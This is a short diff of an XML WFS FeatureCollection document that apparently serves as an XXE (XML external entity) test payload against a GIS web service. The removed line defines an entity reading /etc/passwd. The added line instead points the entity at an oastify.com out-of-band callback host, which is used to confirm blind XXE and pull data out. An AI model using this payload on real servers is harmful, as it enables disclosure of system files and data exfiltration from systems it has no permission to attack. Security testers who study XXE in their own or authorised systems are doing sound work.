@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE FeatureCollection [
-    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    <!ENTITY xxe SYSTEM "http://v51j30bwtfkp580v9r886nutqkwbk68v.oastify.com">
 ]>
 <FeatureCollection xmlns="http://www.opengis.net/wfs"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
